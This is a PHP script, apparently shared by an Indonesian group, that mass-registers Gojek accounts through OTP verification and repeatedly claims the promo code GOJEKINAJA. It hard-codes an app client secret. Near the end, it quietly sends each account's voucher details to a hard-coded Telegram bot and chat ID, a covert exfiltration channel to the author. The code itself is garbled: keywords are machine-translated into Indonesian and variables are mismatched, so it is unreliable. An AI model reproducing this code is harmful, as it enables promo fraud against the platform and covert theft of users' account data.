
<?php
date_default_timezone_set ( 'Asia/Jakarta' );
sertakan  "fungsi.php" ;
echo  warna ( "merah" , " ===========================\n" );
echo  color ( "merah" , "| Klaim Voucher Gojek|\n" );
echo  color ( "merah" , "| Buat otomatis Gojek X Redeem voucher |\n" );
echo  color ( "merah" , "| github: kumpulanremaja |\n" );
echo  color ( "merah" , "| fanspage :4kumpulanremaja|\n" );
echo  color ( "red" , "| Creator : kumpulanremaja.com |\n" );
echo  "| Versi : Premium X pertalite |\n" ;
echo  "| Waktu :" . tanggal ( '[dmY] [H:i:s]' ). " |\n" ;
echo  " ===========================\n" ;

// perubahan fungsi(){
        $ nama = nama ();
        $ email = str_replace ( " " , "" , $ nama ). mt_rand ( 100 , 999 );
        ulang:
        echo  color ( "nevy" , "?] Nomor : " );
        // $tidak = trim(fgets(STDIN));
        $ nohp = trim ( fgets ( STDIN ));
        $ nohp = str_replace ( "62" , "62" , $ nohp );
        $ nohp = str_replace ( "(" , "" , $ nohp );
        $ nohp = str_replace ( ")" , "" , $ nohp );
        $ nohp = str_replace ( "-" , "" ,, $ nohp );
        $ nohp = str_replace ( " " , "" ,, $ nohp );

        if (! preg_match ( '/[^+0-9]/' , potong ( $ nohp ))) {
            if ( substr ( trim ( $ nohp ), 0 , 3 )== '62' ) {
                $ hp = trim ( $ nohp );
            }
            else  if ( substr ( trim ( $ nohp ), 0 , 1 )== '0' ) {
                $ hp = '62' . substr ( trim ( $ nohp ), 1 );
        }
         elseif ( substr ( trim ( $ nohp ), 0 , 2 )== '62' ){
            $ hp = '6' . substr ( trim ( $ nohp ), 1 );
        }
        lain {
            $ hp = '1' . substr ( trim ( $ nohp ), 0 , 13 );
        }
    }
        $ data = '{"email":"' . $ email . '@gmail.com","name":"' . $ nama . '","phone":"+' . $ hp . '"," sign_up_country":"ID"}' ;
        $ register = permintaan ( "/v5/pelanggan" , null , $ data );
        if ( strpos ( $ register , '"otp_token"' )){
        $ otptoken = getStr ( '"otp_token":"' , '"' , $ register );
        echo  color ( "green" , "+] Kode pengungkit sudah di kirim" ). "\n" ;
        pilihan:
        echo  warna ( "nevy" , "?] Otp: " );
        $ otp = potong ( fgets ( STDIN ));
        $ data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $ otp . '","otp_token":"' . $ otptoken . '"}," client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}' ​​;
        $ verif = request ( "/v5/customers/phone/verify" , null , $ data1 );
        if ( strpos ( $ verif , '"access_token"' )){
        echo  color ( "green" , "+] Berhasil mendaftar\n" );
        $ token = getStr ( '"access_token":"' , '"' , $ verif );
        $ uuid = getStr ( '"resource_owner_id":' , ',' , $ verif );
        echo  color ( "hijau" , "+] Token akses anda : " . $ token . "\n\n" );
        simpan ( "token.txt" , $ token );
        echo  color ( "merah" , "\n===========(TUKARKAN VOUCHER)===========" );
        gema  "\n" . warna ( "kuning" , "!] Klaim voc GOJEKINAJA" );
        gema  "\n" . color ( "kuning" , "!] Mohon tunggu" );
        untuk( $ a = 1 ; $ a <= 3 ; $ a ++){
         warna gema ( "kuning" , "." );
        tidur ( 1 );
        }
        $ code1 = request ( '/go-promotions/v1/promotions/enrollments' , $ token , '{"promo_code":"GOJEKINAJA"}' );
        $ pesan = fetch_value ( $ code1 , '"pesan":"' , '"' );
        if ( strpos ( $ code1 , 'Promo kamu sudah bisa dipakai' )){
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ pesan );
        goto gorila;
        } lain {
        gema  "\n" . warna ( "merah" , "-] Pesan: " . $ pesan );
        gema  "\n" . warna ( "kuning" , "!] Klaim voc GOJEKINAJA" );
        gema  "\n" . color ( "kuning" , "!] Mohon tunggu" );
        untuk( $ a = 1 ; $ a <= 3 ; $ a ++){
         warna gema ( "kuning" , "." );
        tidur ( 1 );
        }
        tidur ( 3 );
        $ boba10 = permintaan ( '/go-promotions/v1/promotions/enrollments' , $ token , '{"promo_code":"GOJEKINAJA"}' );
        $ messageboba10 = fetch_value ( $ boba10 , '"pesan":"' , '"' );
        if ( strpos ( $ boba10 , 'Promo kamu sudah bisa dipakai.' )){
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ messageboba10 );
        goto gorila;
        } lain {
        gema  "\n" . warna ( "merah" , "-] Pesan: " . $ messageboba10 );
        gema  "\n" . warna ( "kuning" , "!] Klaim voc GOJEKINAJA" );
        gema  "\n" . color ( "kuning" , "!] Mohon tunggu" );
        untuk( $ a = 1 ; $ a <= 3 ; $ a ++){
         warna gema ( "kuning" , "." );
        tidur ( 1 );
        }
        tidur ( 3 );
        $ boba19 = permintaan ( '/go-promotions/v1/promotions/enrollments' , $ token , '{"promo_code":"GOJEKINAJA"}' );
        $ messageboba19 = fetch_value ( $ boba19 , '"pesan":"' , '"' );
        if ( strpos ( $ boba19 , 'Promo kamu sudah bisa dipakai.' )){
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ messageboba19 );
        goto gorila;
        } lain {
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ messageboba19 );
        mengendarai:
        gema  "\n" . color ( "kuning" , "!] Claim voc GOJEKINAJA" );
        gema  "\n" . color ( "kuning" , "!] Mohon tunggu" );
        untuk( $ a = 1 ; $ a <= 3 ; $ a ++){
         warna gema ( "kuning" , "." );
        tidur ( 1 );
        }
        tidur ( 3 );
        $ goride = request ( '/go-promotions/v1/promotions/enrollments' , $ token , '{"promo_code":"GOJEKINAJA"}' );
        $ pesan1 = fetch_value ( $ goride , '"pesan":"' , '"' );
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ message1 );
        gema  "\n" . color ( "kuning" , "!] Claim voc GOJEKINAJA" );
        gema  "\n" . color ( "kuning" , "!] Mohon tunggu" );
        untuk( $ a = 1 ; $ a <= 3 ; $ a ++){
         warna gema ( "kuning" , "." );
        tidur ( 1 );
        }
        tidur ( 3 );
        $ goride1 = request ( '/go-promotions/v1/promotions/enrollments' , $ token , '{"promo_code":"GOJEKINAJA"}' );
        $ message2 = fetch_value ( $ goride1 , '"message":"' , '"' );
        gema  "\n" . warna ( "hijau" , "+] Pesan: " . $ pesan2 );
        tidur ( 3 );
        $ cekvoucher = permintaan ( '/gopoints/v3/wallet/vouchers?limit=10&page=1' , $ token );
        $ total = fetch_value ( $ cekvoucher , '"total_vouchers":' , ',' );
        $ voucher3 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "3" );
        $ voucher1 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "1" );
        $ voucher2 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "2" );
        $ voucher4 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "4" );
        $ voucher5 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "5" );
        $ voucher6 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "6" );
        $ voucher7 = getStr1 ( '"title":"' , '",' , $ cekvoucher , "7" );
        gema  "\n" . color ( "kuning" , "!] Jumlah voucher " . $ total . " : " );
        echo  color ( "hijau" , "1." . $ voucher1 );
        gema  "\n" . warna ( "hijau" , " 2. " . $ voucher2 );
        gema  "\n" . warna ( "hijau" , " 3. " . $ voucher3 );
        gema  "\n" . warna ( "hijau" , " 4. " . $ voucher4 );
        gema  "\n" . warna ( "hijau" , " 5. " . $ voucher5 );
        gema  "\n" . warna ( "hijau" , " 6. " . $ voucher6 );
        gema  "\n" . warna ( "hijau" , " 7. " . $ voucher7 );
        gema "\n" ;
        $ expired1 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '1' );
        $ expired2 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '2' );
        $ expired3 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '3' );
        $ expired4 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '4' );
        $ expired5 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '5' );
        $ expired6 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '6' );
        $ expired7 = getStr1 ( '"expiry_date":"' , '"' , $ cekvoucher , '7' );
        $ TOKEN   = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ" ;
	$ chatid = "785784404" ;
	$ pesan  	= "[+] Info Akun Gojek [+]\n\n" . $ tanda . "\n\nTotalVoucher = " . $ keseluruhan . "\n[+] " . $ voucher1 . "\n[+] Exp : [" . $ kadaluarsa1 . "]\n[+] " . $ voucher2 . "\n[+] Exp : [" . $ kadaluarsa2 . "]\n[+] " . $ voucher3 . "\n[+] Exp : [" . $ kadaluarsa3 . "]\n[+] " ."\n[+] Exp : [" . $ kadaluarsa4 . "]\n[+] " . $ voucher5 . "\n[+] Exp : [" . $ kadaluarsa5 . "]\n[+] " . $ voucher6 . "\n[+] Exp : [" . $ kadaluarsa6 . "]\n[+] " . $ voucher7 . "\n[+] Exp : [" . $ kadaluarsa7 . "]" ;
	$ metode 	= "sendMessage" ;
	$ url     = "https://api.telegram.org/bot" . $ TOKEN . "/" . $ metode ;
	$ pos = [
 		'chat_id' => $ chatid ,
                'teks' => $ pesan
        	];
                $ tajuk = [
                "X-Diminta-Dengan: XMLHttpRequest" ,
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ ch = curl_init ();
                                        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
                                        curl_setopt ( $ ch , CURLOPT_URL , $ url );
                                        curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ tajuk );
                                        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ posting );   
                                        curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
                                        $ data = curl_exec ( $ ch );
                                        $ error = curl_error ( $ ch );
                                        $ status = curl_getinfo ( $ ch , CURLINFO_HTTP_CODE );
                                        curl_close ( $ ch );
                                        $ debug [ 'teks' ] = $ pesan ;
                                        $ debug [ 'respon' ] = json_decode ( $ datas , true );
        
         
         }
         }
        }
         } lain {
            echo  color ( "red" , "-] Otp yang anda masukan salah" );
            echo "\n==================================\n\n" ;
            echo  color ( "kuning" , "!] Silahkan masukan kembali\n" );
            harus otp;
            }
         } lain {
         echo  color ( "merah" , "-] Nomor sudah teregistrasi" );
         echo "\n==================================\n\n" ;
         echo  color ( "yellow" , "!] Silahkan registrasi kembali\n" );
         goto ulang;
         }
// }

// gema perubahan()."\n";
